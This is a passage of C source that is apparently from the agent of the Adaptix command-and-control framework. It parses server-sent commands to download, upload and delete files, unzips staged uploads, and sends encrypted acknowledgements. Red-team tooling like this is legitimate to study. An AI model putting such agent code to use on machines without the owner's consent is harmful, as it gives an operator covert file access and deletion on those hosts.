        mpack_node_t finish_node = mpack_node_map_cstr_optional(inner_root, "finish");

        if (!mpack_node_is_missing(finish_node)) {

            cmd->finish = mpack_node_bool(finish_node);

            LOG_INFO("  finish: %d", cmd->finish);

        }





        mpack_node_t offset_node = mpack_node_map_cstr_optional(inner_root, "offset");

        if (!mpack_node_is_missing(offset_node)) {

            cmd->offset = mpack_node_u64(offset_node);

            LOG_INFO("  offset: %llu", (unsigned long long)cmd->offset);

        }



        mpack_tree_destroy(&inner_tree);



    }

    else if (mpack_node_type(data_node) == mpack_type_map) {



        LOG_DEBUG("data_node is map, parsing directly...");





        mpack_node_t path_node = mpack_node_map_cstr_optional(data_node, "path");

        if (!mpack_node_is_missing(path_node) &&

            mpack_node_type(path_node) == mpack_type_str) {



            size_t path_len = mpack_node_strlen(path_node);

            if (path_len >= sizeof(cmd->path)) {

                LOG_ERROR("Path too long: %zu", path_len);

                return -1;

            }



            const char* path_str = mpack_node_str(path_node);

            memcpy(cmd->path, path_str, path_len);

            cmd->path[path_len] = '\0';

            LOG_INFO("  path: %s", cmd->path);

        }





        mpack_node_t content_node = mpack_node_map_cstr_optional(data_node, "content");

        if (!mpack_node_is_missing(content_node) &&

            mpack_node_type(content_node) == mpack_type_bin) {

            cmd->content_len = mpack_node_bin_size(content_node);

            cmd->content = malloc(cmd->content_len);

            memcpy(cmd->content, mpack_node_bin_data(content_node), cmd->content_len);

            LOG_INFO("  content_len: %zu", cmd->content_len);

        }





        mpack_node_t finish_node = mpack_node_map_cstr_optional(data_node, "finish");

        if (!mpack_node_is_missing(finish_node)) {

            cmd->finish = mpack_node_bool(finish_node);

            LOG_INFO("  finish: %d", cmd->finish);

        }





        mpack_node_t offset_node = mpack_node_map_cstr_optional(data_node, "offset");

        if (!mpack_node_is_missing(offset_node)) {

            cmd->offset = mpack_node_u64(offset_node);

            LOG_INFO("  offset: %llu", (unsigned long long)cmd->offset);

        }



    }

    else {

        LOG_ERROR("Unexpected data node type: %d", mpack_node_type(data_node));

        return -1;

    }

    return 0;

}



typedef struct {

    char* task_id;

    pthread_t thread;

    UT_hash_handle hh;

} DownloadEntry;



DownloadEntry* downloads = NULL;

pthread_mutex_t downloads_mutex;



int parse_file_download_command(mpack_node_t data_node, file_download_command_t* cmd) {

    if (mpack_node_is_missing(data_node)) {

        LOG_ERROR("File download data node is missing");

        return -1;

    }

    cmd->task[0] = '\0';

    cmd->path[0] = '\0';

    cmd->remote_path[0] = '\0';

    cmd->local_path[0] = '\0';

    cmd->offset = 0;

    cmd->length = 0;

    cmd->file_id = 0;

    cmd->expect_size = 0;

    cmd->expect_mtime = 0;





    if (mpack_node_type(data_node) == mpack_type_bin) {

        LOG_DEBUG("data_node is binary, unpacking...");



        size_t bin_size = mpack_node_bin_size(data_node);

        const char* bin_data = mpack_node_bin_data(data_node);



        LOG_DEBUG("Binary data size: %zu bytes", bin_size);





        mpack_tree_t inner_tree;

        mpack_tree_init_data(&inner_tree, bin_data, bin_size);

        mpack_tree_parse(&inner_tree);



        if (mpack_tree_error(&inner_tree) != mpack_ok) {

            LOG_ERROR("Failed to parse data binary: %s",

                mpack_error_to_string(mpack_tree_error(&inner_tree)));

            mpack_tree_destroy(&inner_tree);

            return -1;

        }



        mpack_node_t inner_root = mpack_tree_root(&inner_tree);





        mpack_node_t task_node = mpack_node_map_cstr_optional(inner_root, "task");

        if (!mpack_node_is_missing(task_node) &&

            mpack_node_type(task_node) == mpack_type_str) {



            size_t task_len = mpack_node_strlen(task_node);

            if (task_len >= sizeof(cmd->task)) {

                LOG_ERROR("Task string too long: %zu", task_len);

                mpack_tree_destroy(&inner_tree);

                return -1;

            }



            const char* task_str = mpack_node_str(task_node);

            memcpy(cmd->task, task_str, task_len);

            cmd->task[task_len] = '\0';

            LOG_INFO("  task: %s", cmd->task);

        }





        mpack_node_t path_node = mpack_node_map_cstr_optional(inner_root, "path");

        if (!mpack_node_is_missing(path_node) &&

            mpack_node_type(path_node) == mpack_type_str) {



            size_t path_len = mpack_node_strlen(path_node);

            if (path_len >= sizeof(cmd->path)) {

                LOG_ERROR("Path too long: %zu", path_len);

                mpack_tree_destroy(&inner_tree);

                return -1;

            }



            const char* path_str = mpack_node_str(path_node);

            memcpy(cmd->path, path_str, path_len);

            cmd->path[path_len] = '\0';

            safe_strncpy(cmd->remote_path, cmd->path, sizeof(cmd->remote_path));

            LOG_INFO("  path: %s", cmd->path);

        }





        mpack_node_t offset_node = mpack_node_map_cstr_optional(inner_root, "offset");

        if (!mpack_node_is_missing(offset_node)) {

            cmd->offset = mpack_node_u64(offset_node);

            LOG_INFO("  offset: %llu", (unsigned long long)cmd->offset);

        }





        mpack_node_t file_id_node = mpack_node_map_cstr_optional(inner_root, "file_id");

        if (!mpack_node_is_missing(file_id_node)) {

            if (mpack_node_type(file_id_node) == mpack_type_str) {

                size_t fid_len = mpack_node_strlen(file_id_node);

                if (fid_len > 0 && fid_len < 32) {

                    char fid_buf[32];

                    const char* fid_str = mpack_node_str(file_id_node);

                    memcpy(fid_buf, fid_str, fid_len);

                    fid_buf[fid_len] = '\0';

                    unsigned long parsed = strtoul(fid_buf, NULL, 16);

                    cmd->file_id = (uint32_t)parsed;

                }

            } else {

                cmd->file_id = mpack_node_u32(file_id_node);

            }

            LOG_INFO("  file_id: 0x%08x", cmd->file_id);

        }



        mpack_node_t expect_size_node = mpack_node_map_cstr_optional(inner_root, "expect_size");

        if (!mpack_node_is_missing(expect_size_node)) {

            cmd->expect_size = mpack_node_u64(expect_size_node);

            LOG_INFO("  expect_size: %llu", (unsigned long long)cmd->expect_size);

        }



        mpack_node_t expect_mtime_node = mpack_node_map_cstr_optional(inner_root, "expect_mtime");

        if (!mpack_node_is_missing(expect_mtime_node)) {

            cmd->expect_mtime = (int64_t)mpack_node_i64(expect_mtime_node);

            LOG_INFO("  expect_mtime: %lld", (long long)cmd->expect_mtime);

        }



        mpack_tree_destroy(&inner_tree);



    }

    else if (mpack_node_type(data_node) == mpack_type_map) {



        LOG_DEBUG("data_node is map, parsing directly...");





        mpack_node_t task_node = mpack_node_map_cstr_optional(data_node, "task");

        if (!mpack_node_is_missing(task_node) &&

            mpack_node_type(task_node) == mpack_type_str) {



            size_t task_len = mpack_node_strlen(task_node);

            if (task_len >= sizeof(cmd->task)) {

                LOG_ERROR("Task string too long: %zu", task_len);

                return -1;

            }



            const char* task_str = mpack_node_str(task_node);

            memcpy(cmd->task, task_str, task_len);

            cmd->task[task_len] = '\0';

            LOG_INFO("  task: %s", cmd->task);

        }





        mpack_node_t path_node = mpack_node_map_cstr_optional(data_node, "path");

        if (!mpack_node_is_missing(path_node) &&

            mpack_node_type(path_node) == mpack_type_str) {



            size_t path_len = mpack_node_strlen(path_node);

            if (path_len >= sizeof(cmd->path)) {

                LOG_ERROR("Path too long: %zu", path_len);

                return -1;

            }



            const char* path_str = mpack_node_str(path_node);

            memcpy(cmd->path, path_str, path_len);

            cmd->path[path_len] = '\0';

            safe_strncpy(cmd->remote_path, cmd->path, sizeof(cmd->remote_path));

            LOG_INFO("  path: %s", cmd->path);

        }





        mpack_node_t offset_node = mpack_node_map_cstr_optional(data_node, "offset");

        if (!mpack_node_is_missing(offset_node)) {

            cmd->offset = mpack_node_u64(offset_node);

            LOG_INFO("  offset: %llu", (unsigned long long)cmd->offset);

        }





        mpack_node_t file_id_node = mpack_node_map_cstr_optional(data_node, "file_id");

        if (!mpack_node_is_missing(file_id_node)) {

            if (mpack_node_type(file_id_node) == mpack_type_str) {

                size_t fid_len = mpack_node_strlen(file_id_node);

                if (fid_len > 0 && fid_len < 32) {

                    char fid_buf[32];

                    const char* fid_str = mpack_node_str(file_id_node);

                    memcpy(fid_buf, fid_str, fid_len);

                    fid_buf[fid_len] = '\0';

                    unsigned long parsed = strtoul(fid_buf, NULL, 16);

                    cmd->file_id = (uint32_t)parsed;

                }

            } else {

                cmd->file_id = mpack_node_u32(file_id_node);

            }

            LOG_INFO("  file_id: 0x%08x", cmd->file_id);

        }



        mpack_node_t expect_size_node = mpack_node_map_cstr_optional(data_node, "expect_size");

        if (!mpack_node_is_missing(expect_size_node)) {

            cmd->expect_size = mpack_node_u64(expect_size_node);

            LOG_INFO("  expect_size: %llu", (unsigned long long)cmd->expect_size);

        }



        mpack_node_t expect_mtime_node = mpack_node_map_cstr_optional(data_node, "expect_mtime");

        if (!mpack_node_is_missing(expect_mtime_node)) {

            cmd->expect_mtime = (int64_t)mpack_node_i64(expect_mtime_node);

            LOG_INFO("  expect_mtime: %lld", (long long)cmd->expect_mtime);

        }



    }

    else {

        LOG_ERROR("Unexpected data node type: %d", mpack_node_type(data_node));

        return -1;

    }

    return 0;

}



int parse_file_remove_command(mpack_node_t data_node, file_remove_command_t* cmd) {

    if (mpack_node_is_missing(data_node)) {

        LOG_ERROR("File remove data node is missing");

        return -1;

    }



    if (mpack_node_type(data_node) == mpack_type_bin) {

        LOG_DEBUG("data_node is binary, unpacking...");



        size_t bin_size = mpack_node_bin_size(data_node);

        const char* bin_data = mpack_node_bin_data(data_node);



        mpack_tree_t inner_tree;

        mpack_tree_init_data(&inner_tree, bin_data, bin_size);

        mpack_tree_parse(&inner_tree);



        if (mpack_tree_error(&inner_tree) != mpack_ok) {

            LOG_ERROR("Failed to parse data binary: %s",

                mpack_error_to_string(mpack_tree_error(&inner_tree)));

            mpack_tree_destroy(&inner_tree);

            return -1;

        }



        mpack_node_t inner_root = mpack_tree_root(&inner_tree);





        mpack_node_t path_node = mpack_node_map_cstr_optional(inner_root, "path");

        if (!mpack_node_is_missing(path_node) &&

            mpack_node_type(path_node) == mpack_type_str) {



            size_t path_len = mpack_node_strlen(path_node);

            if (path_len >= sizeof(cmd->path)) {

                LOG_ERROR("Path too long: %zu", path_len);

                mpack_tree_destroy(&inner_tree);

                return -1;

            }



            const char* path_str = mpack_node_str(path_node);

            memcpy(cmd->path, path_str, path_len);

            cmd->path[path_len] = '\0';

            LOG_INFO("  path: %s", cmd->path);

        }



        mpack_tree_destroy(&inner_tree);



    }

    else if (mpack_node_type(data_node) == mpack_type_map) {



        mpack_node_t path_node = mpack_node_map_cstr_optional(data_node, "path");

        if (!mpack_node_is_missing(path_node) &&

            mpack_node_type(path_node) == mpack_type_str) {



            size_t path_len = mpack_node_strlen(path_node);

            if (path_len >= sizeof(cmd->path)) {

                LOG_ERROR("Path too long: %zu", path_len);

                return -1;

            }



            const char* path_str = mpack_node_str(path_node);

            memcpy(cmd->path, path_str, path_len);

            cmd->path[path_len] = '\0';

            LOG_INFO("  path: %s", cmd->path);

        }



    }

    else {

        LOG_ERROR("Unexpected data node type: %d", mpack_node_type(data_node));

        return -1;

    }

    return 0;

}



int remove_recursive(const char* path) {

    struct stat st;

    if (stat(path, &st) != 0) return -1;



    if (S_ISDIR(st.st_mode)) {

        DIR* dir = opendir(path);

        if (!dir) return -1;



        struct dirent* entry;

        while ((entry = readdir(dir))) {

            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

            char subpath[PATH_MAX];

            snprintf(subpath, sizeof(subpath), "%s/%s", path, entry->d_name);

            remove_recursive(subpath);

        }

        closedir(dir);

        return rmdir(path);

    }

    else {

        return remove(path);

    }

}



#include <libgen.h>



static const char* UPLOAD_RESET_REQUIRED_PREFIX = "UPLOAD_RESET_REQUIRED:";



static void build_upload_error(char* out, size_t out_len, const char* detail) {

    if (out == NULL || out_len == 0) return;

    if (detail == NULL || detail[0] == '\0') {

        snprintf(out, out_len, "%s upload failed", UPLOAD_RESET_REQUIRED_PREFIX);

        return;

    }

    snprintf(out, out_len, "%s %s", UPLOAD_RESET_REQUIRED_PREFIX, detail);

}



typedef struct {

    int initialized;

    int found;

    int use_busybox;

    char path[PATH_MAX];

} unzip_runtime_t;



static unzip_runtime_t g_unzip_runtime = { 0 };



static int upload_file_is_executable(const char* path) {

    struct stat st;



    if (path == NULL || path[0] == '\0') return 0;

    if (stat(path, &st) != 0) return 0;

    if (!S_ISREG(st.st_mode)) return 0;

    return access(path, X_OK) == 0;

}



static int resolve_binary_from_path(const char* binary_name, char* resolved_path, size_t resolved_len) {

    const char* path_env;

    char path_copy[4096];

    char* save_ptr = NULL;

    char* token;



    if (binary_name == NULL || binary_name[0] == '\0' || resolved_path == NULL || resolved_len == 0) {

        return -1;

    }



    path_env = getenv("PATH");

    if (path_env == NULL || path_env[0] == '\0') {

        return -1;

    }

    if (strlen(path_env) >= sizeof(path_copy)) {

        return -1;

    }



    safe_strncpy(path_copy, path_env, sizeof(path_copy));

    token = strtok_r(path_copy, ":", &save_ptr);

    while (token != NULL) {

        char candidate[PATH_MAX];



        if (token[0] == '\0') {

            token = strtok_r(NULL, ":", &save_ptr);

            continue;

        }

        if (snprintf(candidate, sizeof(candidate), "%s/%s", token, binary_name) < (int)sizeof(candidate) &&

            upload_file_is_executable(candidate)) {

            safe_strncpy(resolved_path, candidate, resolved_len);

            return 0;

        }

        token = strtok_r(NULL, ":", &save_ptr);

    }



    return -1;

}



static int resolve_binary_with_fallbacks(const char* binary_name, const char* const* fallback_paths,

    char* resolved_path, size_t resolved_len) {

    size_t i;



    if (resolve_binary_from_path(binary_name, resolved_path, resolved_len) == 0) {

        return 0;

    }



    if (fallback_paths == NULL) {

        return -1;

    }

    for (i = 0; fallback_paths[i] != NULL; ++i) {

        if (upload_file_is_executable(fallback_paths[i])) {

            safe_strncpy(resolved_path, fallback_paths[i], resolved_len);

            return 0;

        }

    }



    return -1;

}



static int resolve_upload_unzip(char* unzip_path, size_t unzip_len, int* use_busybox,

    char* detail, size_t detail_len) {

    static const char* const unzip_fallbacks[] = {

        "/usr/bin/unzip",

        "/bin/unzip",

        "/usr/local/bin/unzip",

        NULL

    };

    static const char* const busybox_fallbacks[] = {

        "/usr/bin/busybox",

        "/bin/busybox",

        "/usr/local/bin/busybox",

        NULL

    };

    const char* path_env = getenv("PATH");



    if (detail != NULL && detail_len > 0) detail[0] = '\0';



    if (!g_unzip_runtime.initialized) {

        g_unzip_runtime.initialized = 1;

        if (resolve_binary_with_fallbacks("unzip", unzip_fallbacks,

            g_unzip_runtime.path, sizeof(g_unzip_runtime.path)) == 0) {

            g_unzip_runtime.found = 1;

            g_unzip_runtime.use_busybox = 0;

        } else if (resolve_binary_with_fallbacks("busybox", busybox_fallbacks,

            g_unzip_runtime.path, sizeof(g_unzip_runtime.path)) == 0) {

            g_unzip_runtime.found = 1;

            g_unzip_runtime.use_busybox = 1;

        }

    }



    if (!g_unzip_runtime.found) {

        if (detail != NULL && detail_len > 0) {

            snprintf(detail, detail_len, "unzip binary not found (PATH=%s)",

                (path_env != NULL && path_env[0] != '\0') ? path_env : "<empty>");

        }

        LOG_ERROR("Upload unzip helper not found (PATH=%s)",

            (path_env != NULL && path_env[0] != '\0') ? path_env : "<empty>");

        return -1;

    }



    if (unzip_path != NULL && unzip_len > 0) {

        safe_strncpy(unzip_path, g_unzip_runtime.path, unzip_len);

    }

    if (use_busybox != NULL) {

        *use_busybox = g_unzip_runtime.use_busybox;

    }



    return 0;

}



static int exec_upload_unzip(const char* unzip_path, int use_busybox, const char* zip_path,

    const char* output_dir, char* err_msg, size_t err_len) {

    int pipefd[2] = { -1, -1 };

    pid_t pid;

    int wait_status;

    int child_errno = 0;

    ssize_t read_len;

    char* const unzip_argv[] = {

        (char*) unzip_path,

        (char*) "-o",

        (char*) "-q",

        (char*) "-j",

        (char*) zip_path,

        (char*) "-d",

        (char*) output_dir,

        NULL

    };

    char* const busybox_argv[] = {

        (char*) unzip_path,

        (char*) "unzip",

        (char*) "-o",

        (char*) "-q",

        (char*) "-j",

        (char*) zip_path,

        (char*) "-d",

        (char*) output_dir,

        NULL

    };

    char* const* argv = use_busybox ? busybox_argv : unzip_argv;



    if (pipe(pipefd) != 0) {

        if (err_msg != NULL && err_len > 0) snprintf(err_msg, err_len, "failed to create unzip pipe: %s", strerror(errno));

        return -1;

    }

    (void) fcntl(pipefd[0], F_SETFD, FD_CLOEXEC);

    (void) fcntl(pipefd[1], F_SETFD, FD_CLOEXEC);



    pid = fork();

    if (pid < 0) {

        close(pipefd[0]);

        close(pipefd[1]);

        if (err_msg != NULL && err_len > 0) snprintf(err_msg, err_len, "failed to fork unzip: %s", strerror(errno));

        return -1;

    }



    if (pid == 0) {

        close(pipefd[0]);

        if (setsid() < 0) {
            child_errno = errno;
            (void) write_all_fd(pipefd[1], &child_errno, sizeof(child_errno));
            close(pipefd[1]);
            _exit(127);
        }

        int devnull_fd = open("/dev/null", O_RDWR);
        if (devnull_fd < 0) {
            child_errno = errno;
            (void) write_all_fd(pipefd[1], &child_errno, sizeof(child_errno));
            close(pipefd[1]);
            _exit(127);
        }

        if (dup2(devnull_fd, STDIN_FILENO) < 0 ||
            dup2(devnull_fd, STDOUT_FILENO) < 0 ||
            dup2(devnull_fd, STDERR_FILENO) < 0) {
            child_errno = errno;
            if (devnull_fd > STDERR_FILENO) close(devnull_fd);
            (void) write_all_fd(pipefd[1], &child_errno, sizeof(child_errno));
            close(pipefd[1]);
            _exit(127);
        }

        if (devnull_fd > STDERR_FILENO) {
            close(devnull_fd);
        }

        (void) signal(SIGPIPE, SIG_DFL);
#ifdef SIGTSTP
        (void) signal(SIGTSTP, SIG_DFL);
#endif
#ifdef SIGTTIN
        (void) signal(SIGTTIN, SIG_DFL);
#endif
#ifdef SIGTTOU
        (void) signal(SIGTTOU, SIG_DFL);
#endif

        execv(unzip_path, argv);

        child_errno = errno;

        (void) write_all_fd(pipefd[1], &child_errno, sizeof(child_errno));

        close(pipefd[1]);

        _exit(127);

    }



    close(pipefd[1]);

    read_len = read(pipefd[0], &child_errno, sizeof(child_errno));

    close(pipefd[0]);



    while (waitpid(pid, &wait_status, 0) < 0) {

        if (errno != EINTR) {

            if (err_msg != NULL && err_len > 0) snprintf(err_msg, err_len, "waitpid failed for unzip: %s", strerror(errno));

            return -1;

        }

    }



    if (read_len > 0) {

        if (err_msg != NULL && err_len > 0) snprintf(err_msg, err_len, "unzip exec failed: %s", strerror(child_errno));

        return -1;

    }

    if (!WIFEXITED(wait_status)) {

        if (WIFSIGNALED(wait_status)) {

            if (err_msg != NULL && err_len > 0) snprintf(err_msg, err_len, "unzip terminated by signal %d", WTERMSIG(wait_status));

        } else if (err_msg != NULL && err_len > 0) {

            snprintf(err_msg, err_len, "unzip did not exit cleanly");

        }

        return -1;

    }

    if (WEXITSTATUS(wait_status) != 0) {

        if (err_msg != NULL && err_len > 0) snprintf(err_msg, err_len, "unzip exited with status %d", WEXITSTATUS(wait_status));

        return -1;

    }



    return 0;

}



static int build_upload_staging_path(const char* final_path, char* staging_path, size_t staging_len) {

    char dir_buf[PATH_MAX];

    char base_buf[PATH_MAX];

    char* dir_name;

    char* base_name;



    if (final_path == NULL || staging_path == NULL || staging_len == 0) return -1;

    safe_strncpy(dir_buf, final_path, sizeof(dir_buf));

    safe_strncpy(base_buf, final_path, sizeof(base_buf));

    dir_name = dirname(dir_buf);

    base_name = basename(base_buf);

    if (dir_name == NULL || base_name == NULL) return -1;

    if (snprintf(staging_path, staging_len, "%s/.%s.adaptix-upload.zip", dir_name, base_name) >= (int)staging_len) {

        return -1;

    }

    return 0;

}



static int handle_file_unzip(const char* zip_path, const char* final_path, char* err_msg, size_t err_len) {

    char dir_buf[PATH_MAX];

    char unzip_path[PATH_MAX];

    char resolve_detail[512];

    char* dir_name;

    struct stat st;

    int use_busybox = 0;



    if (err_msg != NULL && err_len > 0) err_msg[0] = '\0';



    if (zip_path == NULL || final_path == NULL || zip_path[0] == '\0' || final_path[0] == '\0') {

        if (err_msg != NULL && err_len > 0) snprintf(err_msg, err_len, "invalid unzip path");

        return -1;

    }



    if (resolve_upload_unzip(unzip_path, sizeof(unzip_path), &use_busybox,

        resolve_detail, sizeof(resolve_detail)) != 0) {

        if (err_msg != NULL && err_len > 0) {

            snprintf(err_msg, err_len, "%s", resolve_detail[0] != '\0' ? resolve_detail : "unzip binary not found");

        }

        return -1;

    }



    if (stat(zip_path, &st) != 0) {

        if (err_msg != NULL && err_len > 0) snprintf(err_msg, err_len, "staging zip not found: %s", strerror(errno));

        return -1;

    }

    if (st.st_size <= 0) {

        if (err_msg != NULL && err_len > 0) snprintf(err_msg, err_len, "staging zip is empty");

        return -1;

    }



    safe_strncpy(dir_buf, final_path, sizeof(dir_buf));

    dir_name = dirname(dir_buf);

    if (dir_name == NULL || dir_name[0] == '\0') {

        if (err_msg != NULL && err_len > 0) snprintf(err_msg, err_len, "failed to resolve output directory");

        return -1;

    }



    LOG_INFO("Upload unzip helper: %s%s", unzip_path, use_busybox ? " (busybox)" : "");



    if (exec_upload_unzip(unzip_path, use_busybox, zip_path, dir_name, err_msg, err_len) != 0) {

        if (err_msg != NULL && strstr(err_msg, "unzip exited with status 1") != NULL && stat(final_path, &st) == 0) {

            LOG_WARN("unzip reported status 1 but final file exists, treating upload as success: %s", final_path);

        } else {

            return -1;

        }

    }



    if (stat(final_path, &st) != 0) {

        if (err_msg != NULL && err_len > 0) snprintf(err_msg, err_len, "final file missing after unzip: %s", strerror(errno));

        return -1;

    }



    LOG_INFO("Unzipped %s to %s", zip_path, final_path);

    return 0;

}



void build_file_remove_ack(uint8_t** out_data, size_t* out_len, uint64_t task_id) {

    char* data = NULL;

    size_t size = 0;

    mpack_writer_t writer;





    mpack_writer_init_growable(&writer, &data, &size);





    mpack_start_map(&writer, 2);



    // type: 1

    mpack_write_cstr(&writer, "type");

    mpack_write_i32(&writer, 1);



    // object: array of 1 element

    mpack_write_cstr(&writer, "object");

    mpack_start_array(&writer, 1);





    mpack_start_map(&writer, 3);





    mpack_write_cstr(&writer, "code");

    mpack_write_u32(&writer, 11);







    mpack_write_cstr(&writer, "id");

    mpack_write_u32(&writer, task_id);





    // data: null

    mpack_write_cstr(&writer, "data");

    mpack_write_nil(&writer);



    mpack_finish_map(&writer);

    mpack_finish_array(&writer);

    mpack_finish_map(&writer);





    mpack_error_t err = mpack_writer_destroy(&writer);

    if (err != mpack_ok) {



        if (data) {

            MPACK_FREE(data);

        }

        *out_data = NULL;

        *out_len = 0;



        // fprintf(stderr, "mpack writer error: %d\n", err);

        return;

    }





    *out_data = (uint8_t*)data;

    *out_len = size;

}



void handle_file_remove_ack(struct mg_connection *c, uint32_t task_id) {

    uint8_t* ack_plain = NULL;

    size_t ack_plain_len = 0;





    build_file_remove_ack(&ack_plain, &ack_plain_len, task_id);

    if (!ack_plain || ack_plain_len == 0) {

        printf("[ERROR] Failed to build ACK\n");

        return;

    }



    unsigned char session_key[32];





    if (session_key_get(PKT_TYPE_INIT_KEY, session_key, sizeof(session_key)) != 0) {

        fprintf(stderr, "Failed to get session key for type %d\n", PKT_TYPE_INIT_KEY);

        return;

    }





    send_packet(c, (const uint8_t*)ack_plain, (uint32_t)ack_plain_len, session_key);







    free(ack_plain);





}



void build_file_upload_ack(uint8_t** out_data, size_t* out_len, uint64_t task_id) {

    char* data = NULL;

    size_t size = 0;

    mpack_writer_t writer;





    mpack_writer_init_growable(&writer, &data, &size);





    mpack_start_map(&writer, 2);



    // type: 1

    mpack_write_cstr(&writer, "type");

    mpack_write_i32(&writer, 1);



    // object: array of 1 element

    mpack_write_cstr(&writer, "object");

    mpack_start_array(&writer, 1);





    mpack_start_map(&writer, 3);





    mpack_write_cstr(&writer, "code");

    mpack_write_u32(&writer, 6);







    mpack_write_cstr(&writer, "id");

    mpack_write_u32(&writer, task_id);





    // data: null

    mpack_write_cstr(&writer, "data");

    mpack_write_nil(&writer);



    mpack_finish_map(&writer);

    mpack_finish_array(&writer);

    mpack_finish_map(&writer);





    mpack_error_t err = mpack_writer_destroy(&writer);

    if (err != mpack_ok) {



        if (data) {

            MPACK_FREE(data);

        }

        *out_data = NULL;

        *out_len = 0;



        // fprintf(stderr, "mpack writer error: %d\n", err);

        return;

    }





    *out_data = (uint8_t*)data;

    *out_len = size;

}



void handle_file_upload_ack(struct mg_connection *c, uint32_t task_id) {

    uint8_t* ack_plain = NULL;

    size_t ack_plain_len = 0;





    build_file_upload_ack(&ack_plain, &ack_plain_len, task_id);

    if (!ack_plain || ack_plain_len == 0) {

        printf("[ERROR] Failed to build ACK\n");

        return;

    }



    unsigned char session_key[32];





    if (session_key_get(PKT_TYPE_INIT_KEY, session_key, sizeof(session_key)) != 0) {

        fprintf(stderr, "Failed to get session key for type %d\n", PKT_TYPE_INIT_KEY);

        return;

    }





    send_packet(c, (const uint8_t*)ack_plain, (uint32_t)ack_plain_len, session_key);







    free(ack_plain);





}



static int parse_message_type(const unsigned char* buf, int len) {

    mpack_tree_t tree;

    mpack_node_t root;

    int msg_type = -1;



    mpack_tree_init_data(&tree, (const char*)buf, len);

    mpack_tree_parse(&tree);



    if (mpack_tree_error(&tree) != mpack_ok) {

        mpack_tree_destroy(&tree);

        return -1;

    }



    root = mpack_tree_root(&tree);



    if (mpack_node_type(root) != mpack_type_map) {

        mpack_tree_destroy(&tree);

        return -1;

    }



    mpack_node_t type_node = mpack_node_map_cstr_optional(root, "type");

    if (mpack_node_type(type_node) != mpack_type_missing) {

        msg_type = mpack_node_int(type_node);

    }

    else {

        type_node = mpack_node_map_cstr_optional(root, "id");

        if (mpack_node_type(type_node) != mpack_type_missing) {

            msg_type = mpack_node_int(type_node);

        }

    }



    mpack_tree_destroy(&tree);

    return msg_type;

}





static void handle_packet(struct mg_connection *c, const unsigned char *data, uint32_t len) {

    if (len < 1) {

        printf("Error: packet too short\n");

        return;

    }



    process_data(c, data, len);

}



#define ERR_MSG "Connection error...\n"

#define ERR_MSG_LEN 20



typedef struct conn_state {

    int banner_done;

    int banner_state;

} conn_state_t;

typedef enum banner_probe_mode {

    BANNER_PROBE_PACKET = 1,

    BANNER_PROBE_STREAM = 2

} banner_probe_mode_t;

typedef enum banner_probe_result {

    BANNER_PROBE_WAIT = 0,

    BANNER_PROBE_CONSUME = 1,

    BANNER_PROBE_NO_BANNER = 2,

    BANNER_PROBE_INVALID = -1

} banner_probe_result_t;

static int is_text_banner_byte(unsigned char ch) {

    return ch == '\r' || ch == '\n' || ch == '\t' || (ch >= 0x20 && ch <= 0x7e);

}

static int parse_packet_length_prefix(const unsigned char* buf, size_t len, uint32_t* packet_len) {

    uint32_t net_len_raw;
    uint32_t parsed_len;

    if (buf == NULL || len < PACKET_HEADER_SIZE) {

        return 0;

    }

    memcpy(&net_len_raw, buf, sizeof(net_len_raw));
    parsed_len = ntohl(net_len_raw);
    if (parsed_len == 0 || parsed_len > MAX_PACKET_SIZE) {

        return 0;

    }

    if (packet_len != NULL) {

        *packet_len = parsed_len;

    }

    return 1;

}

static banner_probe_result_t probe_optional_banner(const unsigned char* buf, size_t len,
    banner_probe_mode_t mode, size_t* consume_len) {

    size_t i;

    if (consume_len != NULL) {

        *consume_len = 0;

    }

    if (buf == NULL || len == 0) {

        return BANNER_PROBE_WAIT;

    }

    if (mode == BANNER_PROBE_PACKET && parse_packet_length_prefix(buf, len, NULL)) {

        return BANNER_PROBE_NO_BANNER;

    }

    for (i = 0; i < len; i++) {

        unsigned char ch = buf[i];

        if (ch == '\n') {

            if (consume_len != NULL) {

                *consume_len = i + 1;

            }

            return BANNER_PROBE_CONSUME;

        }

        if (!is_text_banner_byte(ch)) {

            if (mode == BANNER_PROBE_STREAM) {

                return BANNER_PROBE_NO_BANNER;

            }

            if (len < PACKET_HEADER_SIZE) {

                return BANNER_PROBE_WAIT;

            }

            return BANNER_PROBE_INVALID;

        }

    }

    if (len >= 256) {

        return BANNER_PROBE_INVALID;

    }

    return BANNER_PROBE_WAIT;

}

static int discard_socket_bytes(int fd, size_t bytes_to_discard) {

    unsigned char scratch[128];

    while (bytes_to_discard > 0) {

        size_t chunk = bytes_to_discard > sizeof(scratch) ? sizeof(scratch) : bytes_to_discard;
        ssize_t n = recv(fd, scratch, chunk, 0);
        if (n < 0) {

            if (errno == EINTR) {

                continue;

            }

            return -1;

        }

        if (n == 0) {

            return -1;

        }

        bytes_to_discard -= (size_t) n;

    }

    return 0;

}





static void process_packets(struct mg_connection *c) {

    struct mg_iobuf *io = &c->recv;



    conn_state_t* st = (conn_state_t*)c->fn_data;

    if (!st) {





        printf("Warning: connection state missing, closing connection\n");

        c->is_closing = 1;

        return;

    }



    // --- Step 1: consume optional text banner before the packet stream ---

    if (st->banner_done == 0) {

        size_t banner_len = 0;
        banner_probe_result_t probe = probe_optional_banner((const unsigned char*) io->buf, io->len,
            BANNER_PROBE_PACKET, &banner_len);

        if (probe == BANNER_PROBE_WAIT) return;

        if (probe == BANNER_PROBE_INVALID) {

            printf("Error: invalid banner prefix on main control connection\n");

            st->banner_state = -1;
            c->is_closing = 1;
            mg_iobuf_del(io, 0, io->len);
            return;

        }

        if (probe == BANNER_PROBE_CONSUME && banner_len > 0) {

            printf("[debug] Skipping banner: %.*s\n", (int) banner_len, io->buf);
            mg_iobuf_del(io, 0, banner_len);

        }

        st->banner_done = 1;
        st->banner_state = (probe == BANNER_PROBE_CONSUME) ? 1 : 2;

    }



       



    while (io->len >= PACKET_HEADER_SIZE) {



        uint32_t net_len_raw;

        memcpy(&net_len_raw, io->buf, 4);

        uint32_t packet_len = ntohl(net_len_raw);





        if (packet_len > MAX_PACKET_SIZE || packet_len == 0) {

            printf("Error: invalid packet length %u\n", packet_len);

            c->is_closing = 1;

            mg_iobuf_del(io, 0, io->len);

            return;

        }





        if (io->len < PACKET_HEADER_SIZE + packet_len) {



            printf("Waiting for more data: have %zu bytes, need %u bytes\n",

                   io->len, PACKET_HEADER_SIZE + packet_len);

            break;

        }





        unsigned char *packet_data = io->buf + PACKET_HEADER_SIZE;



        debug_hex_dump("error info", packet_data, 20);







